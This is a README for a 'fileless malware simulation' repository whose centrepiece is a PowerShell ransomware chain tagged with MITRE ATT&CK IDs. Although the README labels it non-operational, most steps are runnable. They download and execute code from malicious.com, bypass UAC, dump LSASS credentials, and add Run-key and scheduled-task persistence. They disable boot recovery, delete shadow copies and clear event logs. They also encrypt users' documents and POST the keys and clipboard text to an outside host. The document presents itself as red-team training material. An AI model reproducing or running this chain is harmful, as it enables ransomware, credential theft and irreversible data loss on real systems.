
<div align="center">

# 🧠 **100% Fileless Malware Simulation**
> High-fidelity adversary emulation using in-memory execution and LOLBins

![License](https://img.shields.io/badge/license-MIT-black?style=flat-square)
![Status](https://img.shields.io/badge/build-simulation-lightgrey?style=flat-square)
![Scope](https://img.shields.io/badge/type-red_team-blue?style=flat-square)
![MITRE ATT&CK](https://img.shields.io/badge/framework-MITRE_ATT%26CK-red?style=flat-square)

</div>

---

## ❓ What Is Fileless Malware?

Fileless malware:
- Executes **entirely in RAM**
- Uses native OS tools like `PowerShell`, `rundll32`, and `WMIC`
- Reflectively injects into trusted processes
- Launches via macros, registry scripts, or LOLBins

🔒 **No files are written to disk**, making it hard to detect via signature-based AV.

---

## ✅ Is “100% Fileless” Achievable?

✔️ **Yes — in theory.**  
Chains can involve:
- Macro-based phishing
- [Reflective DLL Injection](https://attack.mitre.org/techniques/T1055/001/)
- Native binary abuse (LOLBins)
- No persistent files

⚠️ **In practice**:
- Temporary files or registry keys are often used
- Payloads live in memory
- Disk-based stubs may exist briefly

---

## 🔍 Why It Matters

- 🛡️ AV = file scanning → fails on memory-only payloads  
- 🧬 Fileless = increased stealth, dwell time, and forensic resistance  
- 🎯 Detection needs: EDRs, memory introspection, or behavioral analytics

---

## ⚠️ Legal & Ethical Use Only

This repository is for:
- Emulating **fileless threat behavior**
- Chaining [LOLBins](https://lolbas-project.github.io/)
- Simulating red/purple team adversarial tradecraft
- Safe adversary emulation in **isolated** environments

> 🔐 Use in **authorized labs only**

## 🔗 MITRE ATT&CK-Aligned PowerShell Simulation

> ⚠️ This is a **non-operational** emulation for training and detection tuning.

    <details>
    <summary>💥 Simulated Fileless Ransomware Chain</summary>
    # 🎯 [T1190] – Initial Access (Phishing or Remote Exploit)
    $u = "http://malicious.com/a.ps1"
    try { IEX (New-Object Net.WebClient).DownloadString($u) } catch {}
    
    # 🪞 [T1055.012] – Reflective DLL Injection (In-Memory Execution)
    $encoded = "[Base64ReflectiveDLL]"
    $bytes = [Convert]::FromBase64String($encoded)
    $hMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length)
    [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $hMem, $bytes.Length)
    $entry = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($hMem, [Action])
    $entry.Invoke()
    
    # 🧠 [T1059.001] – PowerShell Command & Control
    $stage2 = "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/next.ps1')"
    Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($stage2)))))
    
    # 🔐 [T1548.002] – UAC Bypass via COM Interface
    (New-Object -ComObject Shell.Application).ShellExecute("powershell", "-nop -w hidden -c `"IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/elevate.ps1')`"", "", "runas", 1)
    
    # 🧪 [T1003.001] – Credential Dumping (LSASS via comsvcs.dll)
    $lsass = (Get-Process lsass).Id
    rundll32 comsvcs.dll, MiniDump $lsass lsass.dmp full
    
    # 🔍 [T1016] – Network Discovery
    ipconfig /all | Out-Null
    Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled } | Select IPAddress, MACAddress
    
    # 🗂️ [T1112] – Registry Modification (Auto-Execution Persistence)
    $eCmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("powershell -nop -w hidden -EncodedCommand [encoded payload]"))
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateSvc" -Value "powershell.exe -EncodedCommand $eCmd" -Force
    
    # 🧫 [T1485] – Data Destruction / Boot Recovery Tampering
    Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
    bcdedit /set {default} recoveryenabled no
    bcdedit /set {default} bootstatuspolicy ignoreallfailures
    
    # 💣 [T1486] – Ransomware File Encryption (In-Memory Key Staging)
    $targetFiles = Get-ChildItem -Path "C:\Users\*\Documents" -Include *.docx,*.xlsx,*.txt -Recurse -ErrorAction SilentlyContinue
    foreach ($file in $targetFiles) {
        $key = -join ((0..255) | Get-Random -Count 32 | ForEach-Object { [char]$_ })
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = [Text.Encoding]::UTF8.GetBytes($key.PadRight(32, 'X'))
        $aes.IV = New-Object Byte[] 16
        $enc = $aes.CreateEncryptor()
        $plain = [IO.File]::ReadAllBytes($file.FullName)
        $crypt = $enc.TransformFinalBlock($plain, 0, $plain.Length)
        [IO.File]::WriteAllBytes($file.FullName, $crypt)
        "$($file.FullName):$key" | Out-File "$env:APPDATA\tempkeys.log" -Append
    }
    
    # 📤 [T1041] – Exfiltration of Encryption Keys (via POST)
    try {
        $keyDump = Get-Content "$env:APPDATA\tempkeys.log" -ErrorAction SilentlyContinue
        $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($keyDump))
        Invoke-RestMethod -Uri "http://malicious.com/xkeys" -Method POST -Body $encoded
    } catch {}
    
    # 🔧 [T1070.004] – Artifact Cleanup
    Remove-Item "$env:APPDATA\tempkeys.log" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\drop.ps1" -Force -ErrorAction SilentlyContinue
    wevtutil cl Security; wevtutil cl System; wevtutil cl Application
    
    # 📌 [T1053.005] – Scheduled Task Persistence
    schtasks /create /tn "SysSync" /tr "powershell -w hidden -ExecutionPolicy Bypass -File $env:APPDATA\run.ps1" /sc onlogon /rl highest
    
    # 📋 [T1115] – Clipboard Data Collection
    Add-Type -AssemblyName PresentationCore
    $text = [Windows.Clipboard]::GetText()
    Invoke-RestMethod -Uri "http://malicious.com/cliplog" -Method POST -Body ([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($text)))
    
    # 💾 [T1070.001] – Shadow Copy Deletion
    Start-Process "vssadmin" -ArgumentList "delete shadows /all /quiet" -WindowStyle Hidden -Wait
    Start-Process "wmic" -ArgumentList "shadowcopy delete" -WindowStyle Hidden -Wait
    
    # ⌛ [T1497.003] – VM/Sandbox Detection & Kill
    $vmCheck = (Get-WmiObject -Class Win32_ComputerSystem).Manufacturer
    if ($vmCheck -match "VirtualBox|VMware|Xen|QEMU") { Stop-Computer -Force }
    
    
    
    </details>

---

## 🧩 LOLBins (Living Off the Land Binaries)

| Binary            | Function                            | Techniques                                          |
|------------------|-------------------------------------|-----------------------------------------------------|
| `rundll32.exe`   | Reflective DLL execution             | [T1218.011](https://attack.mitre.org/techniques/T1218/011/), [T1055.001](https://attack.mitre.org/techniques/T1055/001/) |
| `mshta.exe`      | HTA script execution                 | [T1218.005](https://attack.mitre.org/techniques/T1218/005/) |
| `regsvr32.exe`   | COM script loading                   | [T1218.010](https://attack.mitre.org/techniques/T1218/010/) |
| `wmic.exe`       | Remote execution, WMI abuse          | [T1047](https://attack.mitre.org/techniques/T1047/), [T1021.001](https://attack.mitre.org/techniques/T1021/001/) |
| `certutil.exe`   | Download/decode payloads             | [T1105](https://attack.mitre.org/techniques/T1105/), [T1140](https://attack.mitre.org/techniques/T1140/) |
| `msbuild.exe`    | Compile/execute C# payloads          | [T1127.001](https://attack.mitre.org/techniques/T1127/001/), [T1059.005](https://attack.mitre.org/techniques/T1059/005/) |
| `bitsadmin.exe`  | Background file transfer             | [T1105](https://attack.mitre.org/techniques/T1105/) |
| `schtasks.exe`   | Persistence via task scheduling      | [T1053.005](https://attack.mitre.org/techniques/T1053/005/) |

---

## 📚 Resources

- 🔗 [LOLBAS Project](https://lolbas-project.github.io/)
- 🔗 [MITRE ATT&CK – T1218](https://attack.mitre.org/techniques/T1218/)
- 🔗 [DLL Injection Techniques](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)
- 🔗 [LOLGEN Chain Generator](https://lolgen.hdks.org/)
- 🔗 [LOLOL Farm Sandbox](https://lolol.farm/)
- 🔗 [PrintNightmare Exploit Analysis](https://itm4n.github.io/printnightmare-not-over/)
- 🔗 [Wikipedia – Fileless Malware](https://en.wikipedia.org/wiki/Fileless_malware)
